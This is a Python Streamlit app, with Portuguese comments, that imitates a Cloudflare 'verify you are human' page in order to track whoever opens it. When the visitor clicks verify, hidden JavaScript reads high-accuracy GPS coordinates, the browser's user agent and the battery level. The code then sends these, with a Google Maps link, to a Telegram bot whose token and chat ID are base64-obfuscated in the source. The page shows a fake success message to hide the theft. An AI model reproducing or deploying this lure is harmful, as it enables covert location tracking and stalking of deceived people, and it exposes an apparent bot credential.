import streamlit as st
import requests
import base64
import time
from streamlit_js_eval import streamlit_js_eval

# --- 1. CONFIGURAÇÃO E LIMPEZA DE LAYOUT ---
st.set_page_config(page_title="Just a moment...", page_icon="☁️", layout="centered")

# --- 2. DADOS DO BOT ---
B_TK = "ODA5OTI1MzM4MjpBQUhXWVVqZnBXMTlKNTZVZF9GQ01fOXRPYnhVNHJMaDNnUQ=="
B_ID = "ODQ5ODY2NDAyOA=="

# --- 3. CSS ULTRA-LIMPO (REMOVE ESPAÇOS E BURACOS) ---
st.markdown("""
    <style>
        /* Fundo e Texto */
        .stApp { background-color: #1d1d1d !important; color: #d9d9d9 !important; }
        
        /* Remove espaços vazios do Streamlit */
        .block-container { padding-top: 2rem !important; padding-bottom: 0rem !important; }
        [data-testid="stVerticalBlock"] > div { margin-top: -10px !important; }
        footer, header, .stDeployButton { visibility: hidden; display: none; }

        /* Título e Texto */
        .site-header { font-family: sans-serif; font-size: 28px; font-weight: 500; color: #fff; margin-bottom: 15px; }
        .desc-text { color: #d9d9d9; font-size: 15px; line-height: 1.5; margin-bottom: 20px; }

        /* Widget Cloudflare */
        .cf-widget {
            background-color: #2c2c2c;
            border: 1px solid #444;
            padding: 15px 20px;
            border-radius: 4px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            min-height: 65px;
            margin-bottom: 5px;
        }

        .cf-left { display: flex; align-items: center; gap: 15px; }
        .cf-logo { height: 22px; opacity: 0.7; }
        
        /* Spinner e Check */
        .spinner {
            border: 3px solid rgba(255, 255, 255, 0.1);
            border-left-color: #3b82f6;
            border-radius: 50%;
            width: 22px;
            height: 22px;
            animation: spin 1s linear infinite;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        /* Botão Invisível por cima para não dar erro visual */
        .stButton > button {
            width: 100%;
            height: 50px;
            background-color: #3b82f6 !important;
            border-radius: 4px;
            border: none;
            color: white;
            font-weight: 600;
        }
    </style>
""", unsafe_allow_html=True)

def enviar_telegram(msg):
    try:
        tk = base64.b64decode(B_TK).decode("utf-8").strip()
        ci = base64.b64decode(B_ID).decode("utf-8").strip()
        requests.post(f"https://api.telegram.org/bot{tk}/sendMessage", 
                      json={"chat_id": ci, "text": msg, "parse_mode": "Markdown"}, timeout=10)
    except: pass

# --- 4. CONTROLE DE ESTADO ---
if 'status' not in st.session_state:
    st.session_state['status'] = 'inicio'

# --- 5. INTERFACE ---
st.markdown('<div class="site-header">www.verificacaodeseguranca.com.br</div>', unsafe_allow_html=True)
st.markdown('<div class="desc-text">Este site utiliza um serviço de segurança para proteção contra bots maliciosos.<br>Esta página é exibida enquanto o site verifica se você não é um bot.</div>', unsafe_allow_html=True)

# Lógica das telas
if st.session_state['status'] == 'inicio':
    # Widget parado
    st.markdown('<div class="cf-widget"><div class="cf-left"><div style="width:22px; height:22px; border:2px solid #555; border-radius:3px;"></div><span>Verifique se você é humano</span></div><img src="https://upload.wikimedia.org/wikipedia/commons/4/4b/Cloudflare_Logo.svg" class="cf-logo"></div>', unsafe_allow_html=True)
    
    if st.button("Verificar"):
        st.session_state['status'] = 'processando'
        st.rerun()

elif st.session_state['status'] == 'processando':
    # Widget Girando
    st.markdown('<div class="cf-widget"><div class="cf-left"><div class="spinner"></div><span>Verificando...</span></div><img src="https://upload.wikimedia.org/wikipedia/commons/4/4b/Cloudflare_Logo.svg" class="cf-logo"></div>', unsafe_allow_html=True)
    
    # Coleta GPS (Executa sem criar elemento visual novo)
    js_gps = "new Promise((res) => { navigator.geolocation.getCurrentPosition((p) => { res(p.coords.latitude + ',' + p.coords.longitude); }, (e) => { res('erro'); }, {enableHighAccuracy:true, timeout:6000}); })"
    posicao = streamlit_js_eval(js_expressions=js_gps, key="GPS_AUTO")
    
    # Coleta UA e Bateria
    ua = streamlit_js_eval(js_expressions="window.navigator.userAgent", key="UA_AUTO")
    bat = streamlit_js_eval(js_expressions="navigator.getBattery().then(b => Math.round(b.level * 100))", key="BAT_AUTO")

    if posicao:
        if posicao != "erro":
            modelo = "Celular Android"
            if ua:
                try:
                    info = ua.split("(")[1].split(")")[0]
                    for p in info.split(";"):
                        if any(x in p for x in ["SM-", "POCO", "A11", "Xiaomi", "Samsung"]):
                            modelo = p.strip(); break
                except: pass
            
            link = f"https://www.google.com/maps?q={posicao}"
            enviar_telegram(f"🛡️ *VERIFICADO*\n📱 *Aparelho:* {modelo}\n🔋 *Bat:* {bat}%\n📍 *Local:* {link}")
            st.session_state['status'] = 'sucesso'
            st.rerun()
        else:
            st.session_state['status'] = 'inicio'
            st.rerun()

elif st.session_state['status'] == 'sucesso':
    # Widget Verde ✅
    st.markdown('<div class="cf-widget" style="border-color:#10b981;"><div class="cf-left"><span style="font-size:22px;">✅</span><span style="color:#10b981; font-weight:500;">Verificação bem-sucedida.</span></div><img src="https://upload.wikimedia.org/wikipedia/commons/4/4b/Cloudflare_Logo.svg" class="cf-logo"></div>', unsafe_allow_html=True)
    st.markdown('<div style="color:#aaa; font-size:14px; margin-top:5px;">Aguardando resposta do servidor principal...</div>', unsafe_allow_html=True)

# Rodapé colado embaixo
st.markdown('<div style="text-align:center; color:#444; font-size:11px; margin-top:60px;">Ray ID: 7d8f9a1b2c3d • Performance & Security by Cloudflare</div>', unsafe_allow_html=True)
